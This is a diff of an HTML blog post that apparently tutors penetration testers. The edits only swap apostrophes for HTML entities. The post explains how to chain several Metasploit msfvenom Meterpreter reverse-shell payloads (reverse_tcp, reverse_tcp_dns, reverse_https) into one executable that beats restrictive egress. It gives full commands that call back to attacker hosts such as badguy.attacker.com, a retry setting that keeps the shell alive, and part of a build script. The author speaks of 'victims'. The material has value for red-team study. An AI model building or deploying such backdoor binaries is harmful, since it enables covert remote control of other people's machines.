@@ -128,23 +128,23 @@ Here is the link to the ticket about the change (link) and the revision (r13057)
 ruby msfvenom -p windows/meterpreter/reverse_tcp -f raw -t /tmp/msgbox.raw -k LHOST=192.168.0.102 EXITFUNC=thread &gt; /tmp/rev102msgbox.raw
 ruby msfvenom -p - -f exe &lt; /tmp/rev102msgbox.raw &gt; /tmp/rev102msgbox.exe
 </code></pre><p>This example when &lsquo;rev102msgbox.exe&rsquo; is run will pop up a message box with the default options (Hello, from MSF!) and throw a reverse)tcp connection to 192.168.0.102 over the default port of 4444.</p>
-<p>This is great as an example and a good way to test to see if things are working, but I don't normally like to inform my victims that I'm there by saying hello (especially if I'm not there to see their faces).</p>
+<p>This is great as an example and a good way to test to see if things are working, but I don&rsquo;t normally like to inform my victims that I&rsquo;m there by saying hello (especially if I&rsquo;m not there to see their faces).</p>
 <p>So I thought that this would be a great way of throwing a bunch of payloads together to try a few of the tried and true ways of getting past restrictive networks all in one binary. I started off with 3 payloads:</p>
 <ul>
 <li>reverse_tcp_dns to port 7815</li>
 <li>reverse_tcp_dns to port 80</li>
 <li>reverse_https to port 443</li>
 </ul>
-<p>I chose those because I can change the DNS to point to a new IP address in future without having to regenerate my binary and size really isn't a concern since I won't be using it in an exploit.</p>
+<p>I chose those because I can change the DNS to point to a new IP address in future without having to regenerate my binary and size really isn&rsquo;t a concern since I won&rsquo;t be using it in an exploit.</p>
 <p><em>(<strong>SIDE NOT</strong>E: The motive for the port 7815 one is because sometimes there are proxy settings for port 80 and 443 <em>which the new HTTP/HTTPS payloads can handle (&lsquo;cept for Auth proxies)</em> but for some reason quite regularly companies will still allow odd ports to fly through unencumbered)</em></p>
 <p>Here is what I did:</p>
 <pre><code>./msfvenom -p windows/meterpreter/reverse_https -f raw LHOST=badguy.attacker.com LPORT=443 &gt; /tmp/stage1.raw
 ./msfvenom -p windows/meterpreter/reverse_tcp_dns -f raw LHOST=badguy.attacker.com LPORT=80 -c /tmp/stage1.raw &gt; /tmp/stage2.raw
 ./msfvenom -p windows/meterpreter/reverse_tcp_dns -f exe LHOST=badguy2.attacker.com LPORT=7815 -c /tmp/stage2.raw &gt; /tmp/stage3.exe
-</code></pre><p>Luckily (and you'll see why in a second) I forgot to set up a multi/handler on port 7815, which caused me to notice an issue. When one of the payloads failed to connect, &lsquo;<strong>ExitProcess</strong>&rsquo; was called, causing all of my payloads to die prematurely (even if they had already gotten the second stage).</p>
+</code></pre><p>Luckily (and you&rsquo;ll see why in a second) I forgot to set up a multi/handler on port 7815, which caused me to notice an issue. When one of the payloads failed to connect, &lsquo;<strong>ExitProcess</strong>&rsquo; was called, causing all of my payloads to die prematurely (even if they had already gotten the second stage).</p>
 <p>I tried setting <strong>AutoRunScript</strong> to &lsquo;migrate -f&rsquo; so that the payloads would migrate out into a new Notepad process. But the connection died too quickly and none of the payloads were fast enough at jumping ship.</p>
-<p><strong>ReverseConnectRetries</strong> to the rescue. This is an advanced setting for the reverse_tcp family (ipv6_tcp, nonx_tcp, ord_tcp, tcp, tcp_allports, tcp_dns) which tells the payload how many times to loop through the initial connection. This setting defaults to 5 but can be anything between 1 and 255. The 255 setting is special since it actually sets an infinite loop. Sweet, now our sinking should never call the ExitProcess command right? Not quite, reverse_https and reverse_http doesn't have this setting. We are still in a bit of a race condition if we want to use those payloads but it is a race we can win now at least.</p>
-<p>I wrote a very simple batch file to generate my new binary when I need it (also so I don't have to remember all the commands):</p>
+<p><strong>ReverseConnectRetries</strong> to the rescue. This is an advanced setting for the reverse_tcp family (ipv6_tcp, nonx_tcp, ord_tcp, tcp, tcp_allports, tcp_dns) which tells the payload how many times to loop through the initial connection. This setting defaults to 5 but can be anything between 1 and 255. The 255 setting is special since it actually sets an infinite loop. Sweet, now our sinking should never call the ExitProcess command right? Not quite, reverse_https and reverse_http doesn&rsquo;t have this setting. We are still in a bit of a race condition if we want to use those payloads but it is a race we can win now at least.</p>
+<p>I wrote a very simple batch file to generate my new binary when I need it (also so I don&rsquo;t have to remember all the commands):</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
 </span><span style="color:#75715e"></span>
 echo Building Stage <span style="color:#ae81ff">1</span>
@@ -161,7 +161,7 @@ rm -rf /tmp/stage1.raw /tmp/stage2.raw
 
 echo Done..
 </code></pre></div><p>Plus it tells you whats going on and does a bit of clean up, leaving you with just your hydra-binary. One of the things I thought about adding was the cmd/windows/adduser payload just so if the user is an admin we can start our day off without having to add ourselves a user but I decided against it just for clean up and &ldquo;noise&rdquo; purposes.</p>
-<p>(You'll also notice that one of the payloads is going somewhere else.. no reason to not give your payloads every chance of getting out) Sharing is caring right?</p>
+<p>(You&rsquo;ll also notice that one of the payloads is going somewhere else.. no reason to not give your payloads every chance of getting out) Sharing is caring right?</p>
 
             </div>
         </article>
